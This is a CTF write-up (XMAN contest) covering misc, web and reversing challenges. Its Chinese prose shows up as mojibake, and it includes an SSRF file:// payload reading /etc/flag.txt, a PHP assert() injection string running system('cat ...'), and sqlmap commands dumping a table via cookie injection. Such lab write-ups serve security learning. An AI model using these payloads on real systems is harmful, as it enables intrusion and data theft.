xt":"å”‰pwnè¿˜æ˜¯æ²¡æœ‰å…¥é—¨ã€‚ MISCFILEç”¨DiskGeniusæ¢å¤ç£ç›˜ï¼š XMANé€šè¡Œè¯ä¸åŒçš„ç½‘ç«™è§£å¯†ç»“æœç«Ÿç„¶ä¸ä¸€æ ·ã€‚æœ€åå‘ç°è¿™ä¸ªç½‘ç«™è¿˜è¡Œã€‚ 1a2FuYmJyZ2doamx7emJfX19ffXZ0bGFsbg== ç¬¬ä¸€çœ¼å°±çŸ¥é“å…ˆæ˜¯base64ï¼š 1kanbbrgghjl&#123;zb____&#125;vtlaln æ …æ 7æ åŠ å¯†ï¼š 1kzna&#123;blnl_abj_lbh_trg_vg&#125; å‡¯æ’’ä½ç§»13ä½å¾—åˆ°flagï¼š 1xman&#123;oyay_now_you_get_it&#125; PPAPç”¨wiresharkæ‰“å¼€ï¼Œæœç´¢å…³é”®å­—flagï¼Œå¾ˆå®¹æ˜“æ‰¾åˆ°ä¸€ä¸²base64ï¼š ç»è¿‡åˆ†æä»¥åï¼Œå…·ä½“ç»“æ„åº”è¯¥æ˜¯è¿™æ ·çš„ï¼š 123456789101112131415yaaaaaaaar, land ho! Hey wesley, you got that flag?Ayy, I got yer files right here, matey! [base64&apos;d jpg] [base64&apos;d flag.zip]And here be the map to the booty! [base64&apos;d Haar cascade] I don&apos;t understand, this isn&apos;t even a ma-Yarrrr, the booty be buried by that which the map points to! (no spaces and no caps)Ayy, now I be off. But remember, the factor of scales be 1.02, and the neighborly sorts be limited to 50!Lastly, if ye sail the seven seas, you do be a pirate! jpgæ–‡ä»¶å’Œzipæ–‡ä»¶ä¹‹é—´é€šè¿‡ç­‰å·åˆ¤æ–­åˆ†éš”ã€‚é€šè¿‡pythonå¾—åˆ°ä¸‰ä¸ªæ–‡ä»¶ï¼š 123456789# exampleimport base64f1 = open('b1', 'r')enc1 = f1.read()f2 = open('b1.jpg', 'w')out = base64.b64decode(enc1)f2.write(out)f1.close()f2.close() ç„¶ååˆé€šè¿‡binwalkå‘ç°ï¼Œè¿™é‡Œè¾“å‡ºçš„jpgå›¾ç‰‡å…¶å®ä¸æ­¢ä¸€å¼ ã€‚ç”¨foremostè¾“å‡ºæ‰€æœ‰çš„å›¾ç‰‡ã€‚ ä¸‹é¢ç”¨äº†å®˜æ–¹çš„è„šæœ¬ï¼Œç”¨opencvæ‰¾å‡ºæ•°ç™¾å¼ å›¾ç‰‡çš„å…¶ä¸­ä¸€å¼ æ¥å¾—åˆ°å¯†ç ï¼š 12345678910111213141516171819202122232425import osimport sysimport cv2# Get all of the picturesimgs = os.listdir('jpg')# Cascade we'll be using for detectioncascade = cv2.CascadeClassifier('b3.xml')# From the cluesscaling_factor = 1.02min_neighbors = 10 # Bumped this up until one pic was leftfor img_name in imgs: # Load the image and run the cascade img = cv2.imread(os.path.join('jpg', img_name)) detect = cascade.detectMultiScale(img, scaling_factor, min_neighbors) if len(detect) &gt; 0: for (x, y, w, h) in detect: # X marks the spot! cv2.line(img, (x, y), (x + w, y + h), (255, 0, 0), 2) cv2.line(img, (x, y + h), (x + w, y), (255, 0, 0), 2) # Save the new image cv2.imwrite(os.path.join('detected', img_name), img) æœ€åå¾—åˆ°ä¸€å¼ æµ·ç›—çš„å›¾ç‰‡ï¼Œå®¹æ˜“çŸ¥é“å¯†ç åº”è¯¥æ˜¯skullandcrossbonesï¼Œå¾—åˆ°flagã€‚ AUTOKEYä¸€ä¸ªpcapåŒ…ï¼Œéƒ½æ˜¯usbæµé‡ï¼Œé€šè¿‡tsharkæå–å‡ºæ¥ï¼š 12 âš¡ root@kali î‚° ~/Desktop î‚° tshark -r task_AutoKey.pcapng -T fields -e usb.capdata &gt; usbdata.txtRunning as user \"root\" and group \"root\". This could be dangerous. æŸ¥çœ‹åå‘ç°éƒ½æ˜¯å…«ä¸ªå­—èŠ‚çš„æ•°æ®ï¼Œé‚£ä¹ˆåº”è¯¥æ˜¯é”®ç›˜æµé‡ï¼Œç”¨è„šæœ¬è·‘å‡ºæ¥ï¼š 1234567891011121314151617181920#!usr/bin/env python#-*- coding:utf-8 -*-mappings = &#123; 0x04:\"A\", 0x05:\"B\", 0x06:\"C\", 0x07:\"D\", 0x08:\"E\", 0x09:\"F\", 0x0A:\"G\", 0x0B:\"H\", 0x0C:\"I\", 0x0D:\"J\", 0x0E:\"K\", 0x0F:\"L\", 0x10:\"M\", 0x11:\"N\",0x12:\"O\", 0x13:\"P\", 0x14:\"Q\", 0x15:\"R\", 0x16:\"S\", 0x17:\"T\", 0x18:\"U\",0x19:\"V\", 0x1A:\"W\", 0x1B:\"X\", 0x1C:\"Y\", 0x1D:\"Z\", 0x1E:\"1\", 0x1F:\"2\", 0x20:\"3\", 0x21:\"4\", 0x22:\"5\", 0x23:\"6\", 0x24:\"7\", 0x25:\"8\", 0x26:\"9\", 0x27:\"0\", 0x28:\"\\n\", 0x2a:\"[DEL]\", 0X2B:\" \", 0x2C:\" \", 0x2D:\"-\", 0x2E:\"=\", 0x2F:\"[\", 0x30:\"]\", 0x31:\"\\\\\", 0x32:\"~\", 0x33:\";\", 0x34:\"'\", 0x36:\",\", 0x37:\".\" &#125;nums = []keys = open('usbdata.txt')for line in keys: if line[0]!='0' or line[1]!='0' or line[3]!='0' or line[4]!='0' or line[9]!='0' or line[10]!='0' or line[12]!='0' or line[13]!='0' or line[15]!='0' or line[16]!='0' or line[18]!='0' or line[19]!='0' or line[21]!='0' or line[22]!='0': continue nums.append(int(line[6:8],16))keys.close()output = \"\"for n in nums: if n == 0 : continue if n in mappings: output += mappings[n] else: output += '[unknown]'print 'output :\\n' + output å‡ºæ¥çš„ç»“æœï¼š 12output :[unknown]A[unknown]UTOKEY&apos;&apos;.DECIPHER&apos;[unknown]MPLRVFFCZEYOUJFJKYBXGZVDGQAURKXZOLKOLVTUFBLRNJESQITWAHXNSIJXPNMPLSHCJBTYHZEALOGVIAAISSPLFHLFSWFEHJNCRWHTINSMAMBVEXO[DEL]PZE[DEL]IZ&apos; å»æ‰[uuknown]ï¼Œ[DEL]åˆ™æ˜¯å»æ‰åä¸€ä¸ªå­—ç¬¦ï¼Œå¾—åˆ°ï¼š 12output :AUTOKEY&apos;&apos;.DECIPHER&apos;MPLRVFFCZEYOUJFJKYBXGZVDGQAURKXZOLKOLVTUFBLRNJESQITWAHXNSIJXPNMPLSHCJBTYHZEALOGVIAAISSPLFHLFSWFEHJNCRWHTINSMAMBVEXOZEZ&apos; ç™¾åº¦ä¸€ä¸‹autokeyï¼Œç”¨githubä¸Šæ‰¾åˆ°çš„çš„çˆ†ç ´è„šæœ¬å¾—åˆ°flagã€‚ 123-676.914569565 autokey, klen 8 :&quot;FLAGHERE&quot;, HELLOBOYSANDGIRLSYOUARESOSMARTTHATYOUCANFINDTHEFLAGTHATIHIDEINTHEKEYBOARDPACKAGEFLAGISJHAWLZKEWXHNCDHSLWBAQJTUQZDXYQLFHELLO BOYS AND GIRLS YOU ARE SO SMART THAT YOU CAN FIND THE FLAG THAT I HIDE IN THE KEYBOARD PACKAGE FLAG IS JHAWLZKEWXHNCDHSLWBAQJTUQZDXYQLF WEBSIMPLE SSRFhinté‡Œæç¤ºcurlè¿˜æœ‰flagåœ¨/etc/flag.txtï¼Œå¤§æ¦‚æ˜¯é€šè¿‡fileåè®®è¯»å–æœ¬åœ°æ–‡ä»¶ã€‚payloadï¼š 1file://www.baidu.com/etc/flag.txt# MAKEITç½‘é¡µä¸Šæç¤ºäº†gitï¼ŒçŒœæµ‹å­˜åœ¨.gitæ–‡ä»¶æ³„éœ²ï¼ŒæŠŠæºç ä¸‹è½½ä¸‹æ¥ä¹‹åå®¡è®¡ï¼š 1234567891011121314151617&lt;?phpif (isset($_GET['page'])) &#123; $page = $_GET['page'];&#125; else &#123; $page = \"home\";&#125;$file = \"templates/\" . $page . \".php\";// I heard '..' is dangerous!assert(\"strpos('$file', '..') === false\") or die(\"Detected hacking attempt!\");// TODO: Make this look niceassert(\"file_exists('$file')\") or die(\"That file doesn't exist!\");?&gt; è¿™é‡Œæœ‰assert()ï¼Œå¯ä»¥æ‰§è¡Œå‡½æ•°ä¸­çš„å‘½ä»¤ï¼Œé€šè¿‡æ„é€ é—­åˆå‰é¢çš„strpos()ç»•è¿‡ï¼Œæ¥å¾—åˆ°templates/flag.phpä¸­çš„å†…å®¹ï¼š 11&apos;, &apos;..&apos;) or system(&apos;cat templates/flag.php&apos;); // BBSQLIcookieæ³¨å…¥ï¼ŒPHPSESSIDæ‹¿ä¸‹æ¥ï¼š ç”¨sqlmapè·‘ï¼š 123456// è·‘è¡¨åpython sqlmap.py -u http://202.112.51.184:16080/ --cookie \"PHPSESSID=0f3f8f5bcd396b7d83ea2799a77aea49\" --table --level 2// è·‘åˆ—åpython sqlmap.py -u http://202.112.51.184:16080/ --cookie \"PHPSESSID=0f3f8f5bcd396b7d83ea2799a77aea49\" --columns -T '[GDJM_flag]' --level 2// è·‘flagpython sqlmap.py -u http://202.112.51.184:16080/ --cookie \"PHPSESSID=0f3f8f5bcd396b7d83ea2799a77aea49\" --dump -T '[GDJM_flag]' -C 'flag' --level 2 PSï¼šä¸åŒçš„levelç­‰çº§ï¼ŒSQLMAPæ‰€é‡‡ç”¨çš„ç­–ç•¥ä¹Ÿä¸è¿‘ç›¸åŒï¼Œå½“â€“levelçš„å‚æ•°è®¾å®šä¸º2æˆ–è€…2ä»¥ä¸Šçš„æ—¶å€™ï¼Œsqlmapä¼šå°è¯•æ³¨å…¥Cookieå‚æ•°ï¼›å½“â€“levelå‚æ•°è®¾å®šä¸º3æˆ–è€…3ä»¥ä¸Šçš„æ—¶å€™ï¼Œä¼šå°è¯•å¯¹User-Angentï¼Œrefererè¿›è¡Œæ³¨å…¥ã€‚ REDRAGON QUESTå’Œcsawçš„é‚£é“wyvernå¾ˆåƒï¼Œå¯ä»¥ç”¨angrè·‘å‡ºæ¥ï¼š 12345678910111213141516171819202122232425262728#!/usr/bin/env pythonimport angrimport claripyp = angr.Project('xman_task1')flag_chars = [claripy.BVS('flag_%d' % i, 8) for i in range(28)] # flag's length is 28, every char is 8 bitflag = claripy.Concat(*flag_chars + [claripy.BVV(b'\\n')]) # end with '\\n'st = p.factory.full_init_state( args=['./xman_task1'], # arguments add_options=angr.options.unicorn, stdin=flag, # flag as input)for k in flag_chars: st.solver.add(k != 0) # char is not 0 st.solver.add(k != 10) # char is not '\\n'sm = p.factory.simulation_manager(st)sm.run()out = b''for pp in sm.deadended: out = pp.posix.dumps(1) if b'flag&#123;' in out: out = next(filter(lambda s: b'flag&#123;' in s, out.split())) breakprint 'flag:', out pizzaå¤§ä½¬æä¾›äº†å¦ä¸€ç§æ€è·¯ã€‚å…ˆç”¨ida-pythonå»æ··æ·†ï¼š 1234567891011121314151617181920import ida_xrefimport ida_idaapifrom ida_bytes import get_bytes, patch_bytesdef do_patch(ea): if(get_bytes(ea, 1) == \"\\x8B\"): # mov eax-edi, dword reg = (ord(get_bytes(ea + 1, 1)) &amp; 0b00111000) &gt;&gt; 3 patch_bytes(ea, chr(0xB8 + reg) + \"\\x00\\x00\\x00\\x00\\x90\\x90\") elif(get_bytes(ea, 2) == \"\\x44\\x8B\"): # mov r8d-r15d, dword reg = (ord(get_bytes(ea + 2, 1)) &amp; 0b00111000) &gt;&gt; 3 patch_bytes(ea + 1, chr(0xB8 + reg) + \"\\x00\\x00\\x00\\x00\\x90\\x90\")for addr in xrange(0x610318, 0x6105AC, 4): ref = ida_xref.get_first_dref_to(addr) print(hex(addr).center(20,\"-\")) while(ref != ida_idaapi.BADADDR): do_patch(ref) print(\"patch at \" + hex(ref)) ref = ida_xref.get_next_dref_to(addr, ref) print(\"-\"*20) æœ€åè„šæœ¬ï¼š 12345678secret = [100, 214, 266, 369, 417, 527, 622, 733, 847, 942, 1054, 1106, 1222, 1336, 1441, 1540, 1589, 1686, 1796, 1891, 1996, 2112, 2165, 2260, 2336, 2412, 2498, 2575]n = 0flag = \"\"for i in xrange(0, len(secret)): ch = secret[i] - n n += ch flag += chr(ch)print(flag) EASYWASMgithubä¸Šæ‰¾åˆ°ä¸€ä¸ªå°†wasmè½¬æˆcçš„å·¥å…·ï¼šhttps://github.com/WebAssembly/wabt å‘½ä»¤ï¼šwasm2c easywasm.wasm -o easywasm.c ä¸»è¦éƒ¨åˆ†ï¼š 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185...static void _md5(u32 p0, u32 p1, u32 p2) &#123; ...&#125;static u32 _check(u32 p0) &#123; ...&#125;...static const u8 data_segment_data_0[] = &#123; 0x35, 0x36, 0x32, 0x66, 0x65, 0x33, 0x63, 0x63, 0x35, 0x30, 0x30, 0x31, 0x34, 0x63, 0x32, 0x36, 0x30, 0x64, 0x39, 0x65, 0x38, 0x63, 0x66, 0x34, 0x65, 0x64, 0x33, 0x38, 0x63, 0x37, 0x37, 0x61, 0x00, 0x63, 0x30, 0x32, 0x32, 0x61, 0x64, 0x30, 0x63, 0x63, 0x30, 0x30, 0x37, 0x35, 0x61, 0x39, 0x61, 0x62, 0x31, 0x34, 0x62, 0x34, 0x31, 0x32, 0x61, 0x31, 0x30, 0x38, 0x32, 0x64, 0x35, 0x66, 0x33, 0x00, 0x36, 0x34, 0x63, 0x32, 0x38, 0x36, 0x63, 0x66, 0x63, 0x36, 0x32, 0x33, 0x61, 0x61, 0x38, 0x64, 0x37, 0x64, 0x66, 0x37, 0x63, 0x30, 0x38, 0x38, 0x65, 0x62, 0x66, 0x37, 0x64, 0x37, 0x31, 0x38, 0x00, 0x38, 0x33, 0x36, 0x36, 0x34, 0x62, 0x64, 0x65, 0x65, 0x34, 0x62, 0x36, 0x31, 0x33, 0x62, 0x37, 0x65, 0x37, 0x61, 0x35, 0x31, 0x62, 0x35, 0x32, 0x31, 0x33, 0x34, 0x37, 0x30, 0x61, 0x38, 0x64, 0x00, 0x62, 0x30, 0x32, 0x30, 0x62, 0x66, 0x35, 0x39, 0x38, 0x61, 0x61, 0x61, 0x32, 0x62, 0x33, 0x65, 0x30, 0x33, 0x65, 0x64, 0x30, 0x32, 0x63, 0x38, 0x35, 0x34, 0x33, 0x36, 0x32, 0x36, 0x38, 0x61, 0x00, 0x34, 0x66, 0x64, 0x61, 0x63, 0x35, 0x61, 0x63, 0x38, 0x30, 0x37, 0x35, 0x30, 0x36, 0x39, 0x33, 0x38, 0x31, 0x30, 0x33, 0x65, 0x37, 0x37, 0x35, 0x63, 0x35, 0x30, 0x30, 0x39, 0x39, 0x65, 0x64, 0x00, 0x34, 0x66, 0x64, 0x61, 0x63, 0x35, 0x61, 0x63, 0x38, 0x30, 0x37, 0x35, 0x30, 0x36, 0x39, 0x33, 0x38, 0x31, 0x30, 0x33, 0x65, 0x37, 0x37, 0x35, 0x63, 0x35, 0x30, 0x30, 0x39, 0x39, 0x65, 0x64, 0x00, 0x63, 0x32, 0x33, 0x31, 0x64, 0x36, 0x30, 0x37, 0x62, 0x36, 0x38, 0x32, 0x33, 0x66, 0x64, 0x30, 0x61, 0x36, 0x38, 0x65, 0x38, 0x31, 0x33, 0x37, 0x36, 0x30, 0x38, 0x30, 0x39, 0x37, 0x35, 0x34, 0x00, 0x64, 0x31, 0x36, 0x38, 0x63, 0x32, 0x31, 0x64, 0x31, 0x30, 0x33, 0x37, 0x31, 0x61, 0x35, 0x61, 0x62, 0x36, 0x31, 0x62, 0x63, 0x66, 0x65, 0x36, 0x63, 0x37, 0x35, 0x39, 0x65, 0x66, 0x36, 0x65, 0x00, 0x66, 0x36, 0x30, 0x64, 0x37, 0x30, 0x39, 0x63, 0x63, 0x66, 0x39, 0x38, 0x39, 0x64, 0x38, 0x34, 0x39, 0x30, 0x32, 0x38, 0x66, 0x39, 0x37, 0x61, 0x30, 0x33, 0x64, 0x32, 0x66, 0x33, 0x62, 0x61, 0x00, 0x61, 0x30, 0x31, 0x38, 0x34, 0x66, 0x38, 0x32, 0x34, 0x30, 0x65, 0x32, 0x66, 0x65, 0x34, 0x36, 0x38, 0x36, 0x31, 0x64, 0x63, 0x38, 0x64, 0x31, 0x35, 0x61, 0x38, 0x31, 0x39, 0x63, 0x62, 0x30, 0x00, 0x39, 0x64, 0x62, 0x65, 0x63, 0x34, 0x31, 0x34, 0x33, 0x33, 0x36, 0x65, 0x37, 0x34, 0x31, 0x65, 0x39, 0x63, 0x37, 0x33, 0x34, 0x32, 0x32, 0x64, 0x66, 0x35, 0x39, 0x64, 0x65, 0x32, 0x39, 0x37, 0x00, 0x36, 0x66, 0x62, 0x35, 0x32, 0x30, 0x39, 0x64, 0x38, 0x66, 0x63, 0x38, 0x62, 0x62, 0x38, 0x35, 0x30, 0x37, 0x32, 0x34, 0x35, 0x62, 0x63, 0x66, 0x61, 0x32, 0x34, 0x61, 0x65, 0x31, 0x31, 0x66, 0x00, 0x36, 0x66, 0x62, 0x35, 0x32, 0x30, 0x39, 0x64, 0x38, 0x66, 0x63, 0x38, 0x62, 0x62, 0x38, 0x35, 0x30, 0x37, 0x32, 0x34, 0x35, 0x62, 0x63, 0x66, 0x61, 0x32, 0x34, 0x61, 0x65, 0x31, 0x31, 0x66, 0x00, 0x30, 0x30, 0x63, 0x37, 0x37, 0x66, 0x62, 0x63, 0x36, 0x30, 0x61, 0x35, 0x62, 0x66, 0x63, 0x34, 0x36, 0x36, 0x64, 0x33, 0x64, 0x30, 0x36, 0x39, 0x38, 0x37, 0x36, 0x65, 0x63, 0x33, 0x34, 0x38, 0x00, 0x30, 0x30, 0x63, 0x37, 0x37, 0x66, 0x62, 0x63, 0x36, 0x30, 0x61, 0x35, 0x62, 0x66, 0x63, 0x34, 0x36, 0x36, 0x64, 0x33, 0x64, 0x30, 0x36, 0x39, 0x38, 0x37, 0x36, 0x65, 0x63, 0x33, 0x34, 0x38, 0x00, 0x64, 0x66, 0x33, 0x33, 0x34, 0x36, 0x34, 0x66, 0x62, 0x34, 0x37, 0x31, 0x63, 0x34, 0x36, 0x61, 0x62, 0x61, 0x66, 0x36, 0x39, 0x31, 0x63, 0x30, 0x30, 0x30, 0x61, 0x30, 0x65, 0x33, 0x30, 0x64, 0x00, 0x34, 0x66, 0x64, 0x61, 0x63, 0x35, 0x61, 0x63, 0x38, 0x30, 0x37, 0x35, 0x30, 0x36, 0x39, 0x33, 0x38, 0x31, 0x30, 0x33, 0x65, 0x37, 0x37, 0x35, 0x63, 0x35, 0x30, 0x30, 0x39, 0x39, 0x65, 0x64, 0x00, 0x66, 0x36, 0x30, 0x64, 0x37, 0x30, 0x39, 0x63, 0x63, 0x66, 0x39, 0x38, 0x39, 0x64, 0x38, 0x34, 0x39, 0x30, 0x32, 0x38, 0x66, 0x39, 0x37, 0x61, 0x30, 0x33, 0x64, 0x32, 0x66, 0x33, 0x62, 0x61, 0x00, 0x66, 0x63, 0x63, 0x39, 0x34, 0x61, 0x32, 0x30, 0x35, 0x39, 0x36, 0x66, 0x32, 0x36, 0x31, 0x39, 0x38, 0x36, 0x38, 0x66, 0x33, 0x61, 0x34, 0x62, 0x66, 0x35, 0x32, 0x65, 0x61, 0x64, 0x66, 0x37, 0x00, 0x30, 0x30, 0x63, 0x37, 0x37, 0x66, 0x62, 0x63, 0x36, 0x30, 0x61, 0x35, 0x62, 0x66, 0x63, 0x34, 0x36, 0x36, 0x64, 0x33, 0x64, 0x30, 0x36, 0x39, 0x38, 0x37, 0x36, 0x65, 0x63, 0x33, 0x34, 0x38, 0x00, 0x64, 0x31, 0x36, 0x38, 0x63, 0x32, 0x31, 0x64, 0x31, 0x30, 0x33, 0x37, 0x31, 0x61, 0x35, 0x61, 0x62, 0x36, 0x31, 0x62, 0x63, 0x66, 0x65, 0x36, 0x63, 0x37, 0x35, 0x39, 0x65, 0x66, 0x36, 0x65, 0x00, 0x39, 0x64, 0x62, 0x65, 0x63, 0x34, 0x31, 0x34, 0x33, 0x33, 0x36, 0x65, 0x37, 0x34, 0x31, 0x65, 0x39, 0x63, 0x37, 0x33, 0x34, 0x32, 0x32, 0x64, 0x66, 0x35, 0x39, 0x64, 0x65, 0x32, 0x39, 0x37, 0x00, 0x66, 0x63, 0x63, 0x39, 0x34, 0x61, 0x32, 0x30, 0x35, 0x39, 0x36, 0x66, 0x32, 0x36, 0x31, 0x39, 0x38, 0x36, 0x38, 0x66, 0x33, 0x61, 0x34, 0x62, 0x66, 0x35, 0x32, 0x65, 0x61, 0x64, 0x66, 0x37, 0x00, 0x39, 0x62, 0x33, 0x37, 0x64, 0x62, 0x30, 0x39, 0x31, 0x39, 0x37, 0x39, 0x62, 0x65, 0x64, 0x66, 0x30, 0x30, 0x61, 0x37, 0x30, 0x39, 0x35, 0x38, 0x35, 0x31, 0x62, 0x61, 0x36, 0x66, 0x35, 0x39, 0x00, 0x30, 0x30, 0x63, 0x37, 0x37, 0x66, 0x62, 0x63, 0x36, 0x30, 0x61, 0x35, 0x62, 0x66, 0x63, 0x34, 0x36, 0x36, 0x64, 0x33, 0x64, 0x30, 0x36, 0x39, 0x38, 0x37, 0x36, 0x65, 0x63, 0x33, 0x34, 0x38, 0x00, 0x66, 0x36, 0x30, 0x64, 0x37, 0x30, 0x39, 0x63, 0x63, 0x66, 0x39, 0x38, 0x39, 0x64, 0x38, 0x34, 0x39, 0x30, 0x32, 0x38, 0x66, 0x39, 0x37, 0x61, 0x30, 0x33, 0x64, 0x32, 0x66, 0x33, 0x62, 0x61, 0x00, 0x66, 0x63, 0x63, 0x39, 0x34, 0x61, 0x32, 0x30, 0x35, 0x39, 0x36, 0x66, 0x32, 0x36, 0x31, 0x39, 0x38, 0x36, 0x38, 0x66, 0x33, 0x61, 0x34, 0x62, 0x66, 0x35, 0x32, 0x65, 0x61, 0x64, 0x66, 0x37, 0x00, 0x64, 0x31, 0x36, 0x38, 0x63, 0x32, 0x31, 0x64, 0x31, 0x30, 0x33, 0x37, 0x31, 0x61, 0x35, 0x61, 0x62, 0x36, 0x31, 0x62, 0x63, 0x66, 0x65, 0x36, 0x63, 0x37, 0x35, 0x39, 0x65, 0x66, 0x36, 0x65, 0x00, 0x66, 0x36, 0x30, 0x64, 0x37, 0x30, 0x39, 0x63, 0x63, 0x66, 0x39, 0x38, 0x39, 0x64, 0x38, 0x34, 0x39, 0x30, 0x32, 0x38, 0x66, 0x39, 0x37, 0x61, 0x30, 0x33, 0x64, 0x32, 0x66, 0x33, 0x62, 0x61, 0x00, 0x31, 0x38, 0x33, 0x33, 0x34, 0x32, 0x39, 0x39, 0x37, 0x66, 0x66, 0x65, 0x64, 0x34, 0x62, 0x33, 0x31, 0x38, 0x39, 0x65, 0x39, 0x37, 0x37, 0x64, 0x30, 0x37, 0x37, 0x61, 0x36, 0x30, 0x62, 0x34, 0x00, 0x66, 0x34, 0x30, 0x34, 0x61, 0x33, 0x33, 0x36, 0x38, 0x64, 0x32, 0x64, 0x38, 0x66, 0x35, 0x37, 0x34, 0x36, 0x34, 0x66, 0x37, 0x33, 0x39, 0x64, 0x34, 0x65, 0x64, 0x30, 0x31, 0x63, 0x30, 0x65, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x78, 0xa4, 0x6a, 0xd7, 0x56, 0xb7, 0xc7, 0xe8, 0xdb, 0x70, 0x20, 0x24, 0xee, 0xce, 0xbd, 0xc1, 0xaf, 0x0f, 0x7c, 0xf5, 0x2a, 0xc6, 0x87, 0x47, 0x13, 0x46, 0x30, 0xa8, 0x01, 0x95, 0x46, 0xfd, 0xd8, 0x98, 0x80, 0x69, 0xaf, 0xf7, 0x44, 0x8b, 0xb1, 0x5b, 0xff, 0xff, 0xbe, 0xd7, 0x5c, 0x89, 0x22, 0x11, 0x90, 0x6b, 0x93, 0x71, 0x98, 0xfd, 0x8e, 0x43, 0x79, 0xa6, 0x21, 0x08, 0xb4, 0x49, 0x62, 0x25, 0x1e, 0xf6, 0x40, 0xb3, 0x40, 0xc0, 0x51, 0x5a, 0x5e, 0x26, 0xaa, 0xc7, 0xb6, 0xe9, 0x5d, 0x10, 0x2f, 0xd6, 0x53, 0x14, 0x44, 0x02, 0x81, 0xe6, 0xa1, 0xd8, 0xc8, 0xfb, 0xd3, 0xe7, 0xe6, 0xcd, 0xe1, 0x21, 0xd6, 0x07, 0x37, 0xc3, 0x87, 0x0d, 0xd5, 0xf4, 0xed, 0x14, 0x5a, 0x45, 0x05, 0xe9, 0xe3, 0xa9, 0xf8, 0xa3, 0xef, 0xfc, 0xd9, 0x02, 0x6f, 0x67, 0x8a, 0x4c, 0x2a, 0x8d, 0x42, 0x39, 0xfa, 0xff, 0x81, 0xf6, 0x71, 0x87, 0x22, 0x61, 0x9d, 0x6d, 0x0c, 0x38, 0xe5, 0xfd, 0x44, 0xea, 0xbe, 0xa4, 0xa9, 0xcf, 0xde, 0x4b, 0x60, 0x4b, 0xbb, 0xf6, 0x70, 0xbc, 0xbf, 0xbe, 0xc6, 0x7e, 0x9b, 0x28, 0xfa, 0x27, 0xa1, 0xea, 0x85, 0x30, 0xef, 0xd4, 0x05, 0x1d, 0x88, 0x04, 0x39, 0xd0, 0xd4, 0xd9, 0xe5, 0x99, 0xdb, 0xe6, 0xf8, 0x7c, 0xa2, 0x1f, 0x65, 0x56, 0xac, 0xc4, 0x44, 0x22, 0x29, 0xf4, 0x97, 0xff, 0x2a, 0x43, 0xa7, 0x23, 0x94, 0xab, 0x39, 0xa0, 0x93, 0xfc, 0xc3, 0x59, 0x5b, 0x65, 0x92, 0xcc, 0x0c, 0x8f, 0x7d, 0xf4, 0xef, 0xff, 0xd1, 0x5d, 0x84, 0x85, 0x4f, 0x7e, 0xa8, 0x6f, 0xe0, 0xe6, 0x2c, 0xfe, 0x14, 0x43, 0x01, 0xa3, 0xa1, 0x11, 0x08, 0x4e, 0x82, 0x7e, 0x53, 0xf7, 0x35, 0xf2, 0x3a, 0xbd, 0xbb, 0xd2, 0xd7, 0x2a, 0x91, 0xd3, 0x86, 0xeb, 0x07, 0x00, 0x00, 0x00, 0x0c, 0x00, 0x00, 0x00, 0x11, 0x00, 0x00, 0x00, 0x16, 0x00, 0x00, 0x00, 0x07, 0x00, 0x00, 0x00, 0x0c, 0x00, 0x00, 0x00, 0x11, 0x00, 0x00, 0x00, 0x16, 0x00, 0x00, 0x00, 0x07, 0x00, 0x00, 0x00, 0x0c, 0x00, 0x00, 0x00, 0x11, 0x00, 0x00, 0x00, 0x16, 0x00, 0x00, 0x00, 0x07, 0x00, 0x00, 0x00, 0x0c, 0x00, 0x00, 0x00, 0x11, 0x00, 0x00, 0x00, 0x16, 0x00, 0x00, 0x00, 0x05, 0x00, 0x00, 0x00, 0x09, 0x00, 0x00, 0x00, 0x0e, 0x00, 0x00, 0x00, 0x14, 0x00, 0x00, 0x00, 0x05, 0x00, 0x00, 0x00, 0x09, 0x00, 0x00, 0x00, 0x0e, 0x00, 0x00, 0x00, 0x14, 0x00, 0x00, 0x00, 0x05, 0x00, 0x00, 0x00, 0x09, 0x00, 0x00, 0x00, 0x0e, 0x00, 0x00, 0x00, 0x14, 0x00, 0x00, 0x00, 0x05, 0x00, 0x00, 0x00, 0x09, 0x00, 0x00, 0x00, 0x0e, 0x00, 0x00, 0x00, 0x14, 0x00, 0x00, 0x00, 0x04, 0x00, 0x00, 0x00, 0x0b, 0x00, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00, 0x17, 0x00, 0x00, 0x00, 0x04, 0x00, 0x00, 0x00, 0x0b, 0x00, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00, 0x17, 0x00, 0x00, 0x00, 0x04, 0x00, 0x00, 0x00, 0x0b, 0x00, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00, 0x17, 0x00, 0x00, 0x00, 0x04, 0x00, 0x00, 0x00, 0x0b, 0x00, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00, 0x17, 0x00, 0x00, 0x00, 0x06, 0x00, 0x00, 0x00, 0x0a, 0x00, 0x00, 0x00, 0x0f, 0x00, 0x00, 0x00, 0x15, 0x00, 0x00, 0x00, 0x06, 0x00, 0x00, 0x00, 0x0a, 0x00, 0x00, 0x00, 0x0f, 0x00, 0x00, 0x00, 0x15, 0x00, 0x00, 0x00, 0x06, 0x00, 0x00, 0x00, 0x0a, 0x00, 0x00, 0x00, 0x0f, 0x00, 0x00, 0x00, 0x15, 0x00, 0x00, 0x00, 0x06, 0x00, 0x00, 0x00, 0x0a, 0x00, 0x00, 0x00, 0x0f, 0x00, 0x00, 0x00, 0x15, 0x00, 0x00, 0x00, 0x32, 0x33, 0x33, 0x33, 0x33, 0x33, 0x33, 0x33, 0x33, 0x33, 0x33, 0x33, 0x33, 0x33, 0x33, 0x33, 0x33, 0x33, 0x33, 0x33, 0x33, 0x33, 0x33, 0x33, 0x33, 0x33, 0x33, 0x33, 0x33, 0x33, 0x33, 0x33, &#125;;...static void init_table(void) &#123; uint32_t offset; offset = (*Z_envZ_tableBaseZ_i); (*Z_envZ_table).data[offset + 0] = (wasm_rt_elem_t)&#123;func_types[6], (wasm_rt_anyfunc_t)(&amp;f11)&#125;; 